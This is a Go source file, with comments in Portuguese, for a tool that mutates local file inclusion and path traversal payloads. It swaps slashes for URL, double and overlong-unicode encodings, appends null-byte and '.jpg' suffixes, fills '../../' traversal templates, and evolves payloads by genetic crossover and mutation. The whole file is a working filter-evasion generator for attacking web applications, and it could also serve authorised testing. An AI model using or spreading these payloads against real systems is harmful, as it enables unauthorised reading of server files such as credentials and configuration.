package mutador

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// GenePayload representa um payload com avaliação de fitness (genética)
type GenePayload struct {
	Payload string
	Fitness int
}

// MutarPayload aplica técnicas de evasão LFI realistas em várias camadas
func MutarPayload(base string) []string {
	var variantes []string
	obfuscadores := []string{
		"",             // original
		"%2f",          // URL encoding básico
		"%252f",        // double encoding
		"%c0%af",       // unicode encoding
		"//",           // bypass duplo
		"..%2f",        // traversal encoding
	}

	for _, o := range obfuscadores {
		variantes = append(variantes, strings.ReplaceAll(base, "/", o))
	}

	// Sufixos que quebram parsing
	sufixos := []string{"", "%00", ".jpg", "%00.jpg"}
	var payloadsFinal []string
	for _, v := range variantes {
		for _, s := range sufixos {
			payloadsFinal = append(payloadsFinal, v+s)
		}
	}

	return payloadsFinal
}

// MutarComTemplates gera variantes baseadas em padrões de IA e fuzzing
func MutarComTemplates(dir, target, ext string) []string {
	templates := []string{
		"../../%s/%s.%s",
		"../../../%s/%s.%s%%00",
		"../..%%2f..%%2f%s%%2f%s.%s",
		"../../%s/%s.%s.jpg",
	}

	var results []string
	for _, tpl := range templates {
		payload := fmt.Sprintf(tpl, dir, target, ext)
		results = append(results, payload)
	}
	return results
}

// Crossover realiza recombinação entre dois payloads
func Crossover(p1, p2 GenePayload) GenePayload {
	mid := len(p1.Payload) / 2
	child := p1.Payload[:mid] + p2.Payload[mid:]
	return GenePayload{Payload: child, Fitness: 0}
}

// MutateGene executa mutações realistas sobre o payload
func MutateGene(g GenePayload) GenePayload {
	rand.Seed(time.Now().UnixNano())
	mutations := []string{"%2f", "%252f", "%00", ".jpg", "//", "%c0%af"}
	m := mutations[rand.Intn(len(mutations))]
	pos := rand.Intn(len(g.Payload))
	newPayload := g.Payload[:pos] + m + g.Payload[pos:]
	return GenePayload{Payload: newPayload, Fitness: 0}
}
